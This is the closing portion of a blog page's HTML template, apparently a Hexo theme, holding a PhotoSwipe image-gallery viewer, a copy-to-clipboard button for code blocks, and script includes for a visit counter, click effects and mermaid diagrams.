                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>
 
<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>